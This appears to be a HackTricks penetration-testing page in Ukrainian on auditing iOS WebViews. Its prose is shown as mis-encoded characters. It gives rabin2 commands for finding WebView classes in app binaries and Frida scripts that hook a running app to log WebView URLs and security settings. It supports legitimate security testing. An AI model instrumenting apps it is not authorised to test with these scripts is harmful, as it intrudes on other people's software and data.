# –í–µ–±-–≤–∏–≥–ª—è–¥–∏ iOS

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–µ–∫–ª–∞–º—É –≤–∞—à–æ—ó –∫–æ–º–ø–∞–Ω—ñ—ó –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

–ö–æ–¥ —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –±—É–≤ –≤–∏—Ç—è–≥–Ω—É—Ç–∏–π –∑ [—Ç—É—Ç](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md). –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Å—Ç–æ—Ä—ñ–Ω–∫—É –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –≤—ñ–¥–æ–º–æ—Å—Ç–µ–π.


## –¢–∏–ø–∏ –≤–µ–±-–≤–∏–≥–ª—è–¥—ñ–≤

–í–µ–±-–≤–∏–≥–ª—è–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –≤ –¥–æ–¥–∞—Ç–∫–∞—Ö –¥–ª—è —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–æ–≥–æ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–Ω—è –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç—É. –†—ñ–∑–Ω—ñ —Ç–∏–ø–∏ –≤–µ–±-–≤–∏–≥–ª—è–¥—ñ–≤ –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ä—ñ–∑–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—ó –±–µ–∑–ø–µ–∫–∏ –¥–ª—è –¥–æ–¥–∞—Ç–∫—ñ–≤ iOS. –û—Å—å –∫–æ—Ä–æ—Ç–∫–∏–π –æ–≥–ª—è–¥:

- **UIWebView**, —è–∫–∏–π –±—ñ–ª—å—à–µ –Ω–µ —Ä–µ–∫–æ–º–µ–Ω–¥—É—î—Ç—å—Å—è –∑ iOS 12 —á–µ—Ä–µ–∑ –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è **JavaScript**, —â–æ —Ä–æ–±–∏—Ç—å –π–æ–≥–æ –≤—Ä–∞–∑–ª–∏–≤–∏–º –¥–æ –≤–Ω–µ–¥—Ä–µ–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ —Ç–∞ –∞—Ç–∞–∫ **Cross-Site Scripting (XSS)**.

- **WKWebView** —î –ø–µ—Ä–µ–≤–∞–≥–æ—é –¥–ª—è –≤–∫–ª—é—á–µ–Ω–Ω—è –≤–º—ñ—Å—Ç—É –≤ –¥–æ–¥–∞—Ç–∫–∏, –ø—Ä–æ–ø–æ–Ω—É—é—á–∏ –ø–æ–∫—Ä–∞—â–µ–Ω–µ –∫–µ—Ä—É–≤–∞–Ω–Ω—è –≤–º—ñ—Å—Ç–æ–º —Ç–∞ —Ñ—É–Ω–∫—Ü—ñ—è–º–∏ –±–µ–∑–ø–µ–∫–∏. **JavaScript** —É–≤—ñ–º–∫–Ω–µ–Ω–æ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, –∞–ª–µ –π–æ–≥–æ –º–æ–∂–Ω–∞ –≤–∏–º–∫–Ω—É—Ç–∏ –∑–∞ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ. –í—ñ–Ω —Ç–∞–∫–æ–∂ –ø—ñ–¥—Ç—Ä–∏–º—É—î —Ñ—É–Ω–∫—Ü—ñ—ó –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–º—É –≤—ñ–¥–∫—Ä–∏—Ç—Ç—é –≤—ñ–∫–æ–Ω JavaScript —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á—É—î –±–µ–∑–ø–µ—á–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –≤—Å—å–æ–≥–æ –≤–º—ñ—Å—Ç—É. –ö—Ä—ñ–º —Ç–æ–≥–æ, –∞—Ä—Ö—ñ—Ç–µ–∫—Ç—É—Ä–∞ **WKWebView** –º—ñ–Ω—ñ–º—ñ–∑—É—î —Ä–∏–∑–∏–∫ –≤–ø–ª–∏–≤—É –Ω–∞ –ø–∞–º'—è—Ç—å, —â–æ –≤–ø–ª–∏–≤–∞—î –Ω–∞ –æ—Å–Ω–æ–≤–Ω–∏–π –ø—Ä–æ—Ü–µ—Å –¥–æ–¥–∞—Ç–∫–∞.

- **SFSafariViewController** –ø—Ä–æ–ø–æ–Ω—É—î —Å—Ç–∞–Ω–¥–∞—Ä—Ç–∏–∑–æ–≤–∞–Ω–∏–π –¥–æ—Å–≤—ñ–¥ –ø–µ—Ä–µ–≥–ª—è–¥—É –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–æ–∫ —É –¥–æ–¥–∞—Ç–∫–∞—Ö, —è–∫–∏–π –≤—ñ–¥—Ä—ñ–∑–Ω—è—î—Ç—å—Å—è —Å–≤–æ—î—é –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—é –∫–æ–º–ø–æ–Ω–æ–≤–∫–æ—é, –≤–∫–ª—é—á–∞—é—á–∏ –ª–∏—à–µ –¥–ª—è —á–∏—Ç–∞–Ω–Ω—è –ø–æ–ª–µ –∞–¥—Ä–µ—Å–∏, –∫–Ω–æ–ø–∫–∏ –æ–±–º—ñ–Ω—É —Ç–∞ –Ω–∞–≤—ñ–≥–∞—Ü—ñ—ó, –∞ —Ç–∞–∫–æ–∂ –ø—Ä—è–º–µ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –≤—ñ–¥–∫—Ä–∏—Ç—Ç—è –≤–º—ñ—Å—Ç—É –≤ Safari. –ù–∞ –≤—ñ–¥–º—ñ–Ω—É –≤—ñ–¥ **WKWebView**, **JavaScript** –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω–∏–π –≤ **SFSafariViewController**, —è–∫–∏–π —Ç–∞–∫–æ–∂ —Å–ø—ñ–ª—å–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î —Ñ–∞–π–ª–∏ cookie —Ç–∞ –¥–∞–Ω—ñ –∑ Safari, –∑–±–µ—Ä—ñ–≥–∞—é—á–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ—Å—Ç—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤—ñ–¥ –¥–æ–¥–∞—Ç–∫–∞. –í—ñ–Ω –ø–æ–≤–∏–Ω–µ–Ω –±—É—Ç–∏ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–∏–π –≤–∏–¥–Ω–æ –∑–≥—ñ–¥–Ω–æ –∑ –≤–∏–º–æ–≥–∞–º–∏ App Store.
```javascript
// Example of disabling JavaScript in WKWebView:
WKPreferences *preferences = [[WKPreferences alloc] init];
preferences.javaScriptEnabled = NO;
WKWebViewConfiguration *config = [[WKWebViewConfiguration alloc] init];
config.preferences = preferences;
WKWebView *webView = [[WKWebView alloc] initWithFrame:CGRectZero configuration:config];
```
## –û–≥–ª—è–¥ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è WebViews

### **–ó–∞–≥–∞–ª—å–Ω–∏–π –æ–≥–ª—è–¥ —Å—Ç–∞—Ç–∏—á–Ω–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É**

–ü—ñ–¥ —á–∞—Å –≤–∏–≤—á–µ–Ω–Ω—è –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π **WebViews** –∞–∫—Ü–µ–Ω—Ç—É—î—Ç—å—Å—è –Ω–∞ –¥–≤–æ—Ö –æ—Å–Ω–æ–≤–Ω–∏—Ö —Ç–∏–ø–∞—Ö: **UIWebView** —Ç–∞ **WKWebView**. –î–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —Ü–∏—Ö WebViews —É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –∫–æ–º–∞–Ω–¥–∏, —â–æ —à—É–∫–∞—é—Ç—å –∫–æ–Ω–∫—Ä–µ—Ç–Ω—ñ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –∫–ª–∞—Å–∏ —Ç–∞ –º–µ—Ç–æ–¥–∏ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó.

- **–Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
```
–¶—è –∫–æ–º–∞–Ω–¥–∞ –¥–æ–ø–æ–º–∞–≥–∞—î –∑–Ω–∞—Ö–æ–¥–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ **UIWebView**, —à—É–∫–∞—é—á–∏ —Ç–µ–∫—Å—Ç–æ–≤—ñ —Ä—è–¥–∫–∏, —â–æ —Å—Ç–æ—Å—É—é—Ç—å—Å—è –π–æ–≥–æ –≤ –±—ñ–Ω–∞—Ä–Ω–æ–º—É –∫–æ–¥—ñ.

- **–Ü–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—è WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
```
–¢–∞–∫ —Å–∞–º–æ, –¥–ª—è **WKWebView**, —Ü—è –∫–æ–º–∞–Ω–¥–∞ —à—É–∫–∞—î –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –¥–ª—è —Ç–µ–∫—Å—Ç–æ–≤–∏—Ö —Ä—è–¥–∫—ñ–≤, —â–æ —Å–≤—ñ–¥—á–∞—Ç—å –ø—Ä–æ –π–æ–≥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è.

–ö—Ä—ñ–º —Ç–æ–≥–æ, —â–æ–± –∑–Ω–∞–π—Ç–∏, —è–∫ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑—É—î—Ç—å—Å—è **WKWebView**, –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∞ –∫–æ–º–∞–Ω–¥–∞, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∞ –Ω–∞ –ø—ñ–¥–ø–∏—Å –º–µ—Ç–æ–¥—É, –ø–æ–≤'—è–∑–∞–Ω–æ–≥–æ –∑ –π–æ–≥–æ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—î—é:
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
```
#### **–ü–µ—Ä–µ–≤—ñ—Ä–∫–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó JavaScript**

–î–ª—è **WKWebView** –≤—ñ–¥–∑–Ω–∞—á–∞—î—Ç—å—Å—è, —â–æ –≤–∏–º–∫–Ω–µ–Ω–Ω—è JavaScript —î –Ω–∞–π–∫—Ä–∞—â–æ—é –ø—Ä–∞–∫—Ç–∏–∫–æ—é, —è–∫—â–æ —Ü–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ. –ö–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è, —â–æ–± –ø—ñ–¥—Ç–≤–µ—Ä–¥–∏—Ç–∏, —â–æ –≤–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `javaScriptEnabled` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ `false`, —â–æ –≥–∞—Ä–∞–Ω—Ç—É—î –≤–∏–º–∫–Ω–µ–Ω–Ω—è JavaScript:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
```
#### **–õ–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ –±–µ–∑–ø–µ—á–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É**

**WKWebView** –ø—Ä–æ–ø–æ–Ω—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏—è–≤–ª–µ–Ω–Ω—è –ø—Ä–æ–±–ª–µ–º –∑–º—ñ—à–∞–Ω–æ–≥–æ –≤–º—ñ—Å—Ç—É, –≤—ñ–¥–º—ñ–Ω–Ω–æ –≤—ñ–¥ **UIWebView**. –¶–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç—ñ `hasOnlySecureContent`, —â–æ–± –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏, —â–æ –≤—Å—ñ —Ä–µ—Å—É—Ä—Å–∏ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è —á–µ—Ä–µ–∑ –±–µ–∑–ø–µ—á–Ω—ñ –∑'—î–¥–Ω–∞–Ω–Ω—è. –ü–æ—à—É–∫ —É —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
### **–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑**

–î–∏–Ω–∞–º—ñ—á–Ω–∏–π –∞–Ω–∞–ª—ñ–∑ –≤–∫–ª—é—á–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –∫—É–ø–∏ –¥–ª—è –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ WebView —Ç–∞ —ó—Ö –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π. –°—Ü–µ–Ω–∞—Ä—ñ–π –ø—ñ–¥ –Ω–∞–∑–≤–æ—é `webviews_inspector.js` –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è —Ü—ñ—î—ó –º–µ—Ç–∏, —Å–ø—Ä—è–º–æ–≤–∞–Ω–∏–π –Ω–∞ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ `UIWebView`, `WKWebView` —Ç–∞ `SFSafariViewController`. –í—ñ–Ω —Ä–µ—î—Å—Ç—Ä—É—î —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∑–Ω–∞–π–¥–µ–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏, –≤–∫–ª—é—á–∞—é—á–∏ URL-–∞–¥—Ä–µ—Å–∏ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è, –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ JavaScript —Ç–∞ –±–µ–∑–ø–µ—á–Ω–∏–º –≤–º—ñ—Å—Ç–æ–º.

–ü–µ—Ä–µ–≤—ñ—Ä–∫—É –∫—É–ø–∏ –º–æ–∂–Ω–∞ –ø—Ä–æ–≤–µ—Å—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ `ObjC.choose()` –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ WebView —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –≤–ª–∞—Å—Ç–∏–≤–æ—Å—Ç–µ–π `javaScriptEnabled` —Ç–∞ `hasonlysecurecontent`.

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
{% endcode %}

–°–∫—Ä–∏–ø—Ç –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js
```
**–û—Å–Ω–æ–≤–Ω—ñ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∏**:
- –í–¥–∞–ª–æ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å—Å—è –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ WebViews.
- –ü–µ—Ä–µ–≤—ñ—Ä—è—î—Ç—å—Å—è –∞–∫—Ç–∏–≤–∞—Ü—ñ—è JavaScript —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É.

–¶–µ–π –æ–≥–ª—è–¥ —É–∑–∞–≥–∞–ª—å–Ω—é—î –∫—Ä–∏—Ç–∏—á–Ω—ñ –∫—Ä–æ–∫–∏ —Ç–∞ –∫–æ–º–∞–Ω–¥–∏, —è–∫—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π WebView —á–µ—Ä–µ–∑ —Å—Ç–∞—Ç–∏—á–Ω—ñ —Ç–∞ –¥–∏–Ω–∞–º—ñ—á–Ω—ñ –ø—ñ–¥—Ö–æ–¥–∏, –∑–æ—Å–µ—Ä–µ–¥–∂—É—é—á–∏—Å—å –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è—Ö –±–µ–∑–ø–µ–∫–∏, —Ç–∞–∫–∏—Ö —è–∫ –∞–∫—Ç–∏–≤–∞—Ü—ñ—è JavaScript —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è –∑–º—ñ—à–∞–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É.

## –û–±—Ä–æ–±–∫–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ WebView

–û–±—Ä–æ–±–∫–∞ –∫–æ–Ω—Ç–µ–Ω—Ç—É –≤ WebViews —î –∫—Ä–∏—Ç–∏—á–Ω–∏–º –∞—Å–ø–µ–∫—Ç–æ–º, –æ—Å–æ–±–ª–∏–≤–æ –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ `http(s)://`, `file://` —Ç–∞ `tel://`. –¶—ñ –ø—Ä–æ—Ç–æ–∫–æ–ª–∏ –¥–æ–∑–≤–æ–ª—è—é—Ç—å –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —è–∫ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏–π, —Ç–∞–∫ —ñ –ª–æ–∫–∞–ª—å–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç —É –¥–æ–¥–∞—Ç–∫–∞—Ö. –ù–∞–≥–æ–ª–æ—à—É—î—Ç—å—Å—è, —â–æ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –≤–∂–∏–≤–∞—Ç–∏ –∑–∞—Ö–æ–¥—ñ–≤ –¥–ª—è –∑–∞–ø–æ–±—ñ–≥–∞–Ω–Ω—è –≤–ø–ª–∏–≤—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –Ω–∞ —ñ–º'—è –∞–±–æ —à–ª—è—Ö —Ñ–∞–π–ª—É —Ç–∞ –≤—ñ–¥—Ä–µ–¥–∞–≥–æ–≤–∞–Ω–Ω—è —Å–∞–º–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç—É.

**WebViews** –ø—Ä–æ–ø–æ–Ω—É—é—Ç—å —Ä—ñ–∑–Ω—ñ –º–µ—Ç–æ–¥–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–Ω—Ç—É. –î–ª—è **UIWebView**, —è–∫–∏–π –∑–∞—Ä–∞–∑ –∑–∞—Å—Ç–∞—Ä—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –º–µ—Ç–æ–¥–∏, —Ç–∞–∫—ñ —è–∫ `loadHTMLString:baseURL:` —Ç–∞ `loadData:MIMEType:textEncodingName:baseURL:`. **WKWebView**, –∑ —ñ–Ω—à–æ–≥–æ –±–æ–∫—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î `loadHTMLString:baseURL:`, `loadData:MIMEType:textEncodingName:baseURL:` —Ç–∞ `loadRequest:` –¥–ª—è –≤–µ–±-–∫–æ–Ω—Ç–µ–Ω—Ç—É. –ú–µ—Ç–æ–¥–∏, —Ç–∞–∫—ñ —è–∫ `pathForResource:ofType:`, `URLForResource:withExtension:` —Ç–∞ `init(contentsOf:encoding:)`, –∑–∞–∑–≤–∏—á–∞–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤. –ú–µ—Ç–æ–¥ `loadFileURL:allowingReadAccessToURL:` –æ—Å–æ–±–ª–∏–≤–æ –≤—ñ–¥–æ–º–∏–π —Å–≤–æ—î—é –º–æ–∂–ª–∏–≤—ñ—Å—Ç—é –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π URL –∞–±–æ –∫–∞—Ç–∞–ª–æ–≥ —É WebView, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –≤–∏–∫—Ä–∏—Ç–∏ —á—É—Ç–ª–∏–≤—ñ –¥–∞–Ω—ñ —É —Ä–∞–∑—ñ –≤–∫–∞–∑–∞–Ω–Ω—è –∫–∞—Ç–∞–ª–æ–≥—É.

–î–ª—è –ø–æ—à—É–∫—É —Ü–∏—Ö –º–µ—Ç–æ–¥—ñ–≤ —É –≤–∏—Ö—ñ–¥–Ω–æ–º—É –∫–æ–¥—ñ –∞–±–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–æ–º—É –±—ñ–Ω–∞—Ä–Ω–æ–º—É —Ñ–∞–π–ª—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ç–∞–∫—ñ –∫–æ–º–∞–Ω–¥–∏:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
–©–æ–¥–æ **–¥–æ—Å—Ç—É–ø—É –¥–æ —Ñ–∞–π–ª—ñ–≤**, UIWebView –¥–æ–∑–≤–æ–ª—è—î –π–æ–≥–æ —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ, —Ç–æ–¥—ñ —è–∫ WKWebView –≤–≤–æ–¥–∏—Ç—å –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è `allowFileAccessFromFileURLs` —Ç–∞ `allowUniversalAccessFromFileURLs` –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –¥–æ—Å—Ç—É–ø–æ–º –∑ —Ñ–∞–π–ª–æ–≤–∏—Ö URL-–∞–¥—Ä–µ—Å, –æ–±–∏–¥–≤–∞ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –≤ –∑–Ω–∞—á–µ–Ω–Ω—è false.

–ù–∞–≤–µ–¥–µ–Ω–æ –ø—Ä–∏–∫–ª–∞–¥ —Å–∫—Ä–∏–ø—Ç–∞ Frida –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π **WKWebView** –¥–ª—è –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω—å –±–µ–∑–ø–µ–∫–∏:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```
